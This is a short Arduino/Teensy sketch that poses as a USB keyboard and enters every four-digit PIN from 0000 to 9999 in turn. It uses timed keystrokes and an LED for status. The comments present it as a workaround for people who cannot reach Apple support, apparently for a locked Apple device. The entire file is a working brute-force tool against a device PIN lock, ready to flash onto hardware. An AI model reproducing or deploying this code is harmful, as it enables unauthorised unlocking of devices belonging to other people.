#include <usb_keyboard.h>
// This code is licensed under Apache 2.0 License
// http://www.apache.org/licenses/LICENSE-2.0.txt
// Limitation of Liability. In no event and under no legal theory,
// whether in tort (including negligence), contract, or otherwise,
// unless required by applicable law (such as deliberate and grossly
// negligent acts) or agreed to in writing, shall any Contributor be
// liable to You for damages, including any direct, indirect, special,
// incidental, or consequential damages of any character arising as a
// result of this License or out of the use or inability to use the
// Work (including but not limited to damages for loss of goodwill,
// work stoppage, computer failure or malfunction, or any and all
// other commercial damages or losses), even if such Contributor
// has been advised of the possibility of such damages.
// This code is indented for people who are not able to contact
// apple support and I am in no way liable for any damage or
// problems this code might cause.

const int ledPin = 13; // choose the pin for the LED
int counter = 0;
int fakecounter = counter;
char pin[]="xxxx";

void setup() {
  pinMode(ledPin, OUTPUT); // declare LED as output
  delay(10000);
}

void loop(){
  keyboard_modifier_keys = 0;
  if (counter <= 9999){
    delay(8000);
    digitalWrite(ledPin, LOW);
    delay(5500);
    digitalWrite(ledPin, HIGH);
    sprintf(pin, "%04d", fakecounter);
    //sending first digit
    Keyboard.press(pin[0]);
    delay(450);
    Keyboard.release(pin[0]);
    delay(420);
    //sending second digit
    Keyboard.press(pin[1]);
    delay(398);
    Keyboard.release(pin[1]);
    delay(510);
    //sending third digit
    Keyboard.press(pin[2]);
    delay(421);
    Keyboard.release(pin[2]);
    delay(423);
    //sending forth digit
    Keyboard.press(pin[3]);
    delay(430);
    Keyboard.release(pin[3]);
    delay(525);
    //sending enter
    Keyboard.press(KEY_ENTER);
    delay(305);
    Keyboard.release(KEY_ENTER);
  }
  //reached 4 digit PIN max value
  if (counter > 9999){
    for (int blinkies = 0; blinkies < 8; blinkies++) {
      digitalWrite(ledPin, HIGH);
      delay(20);
      digitalWrite(ledPin, LOW);
     delay(200);
    }
    delay(6000);
  }
  ++counter;
  fakecounter = counter;
}
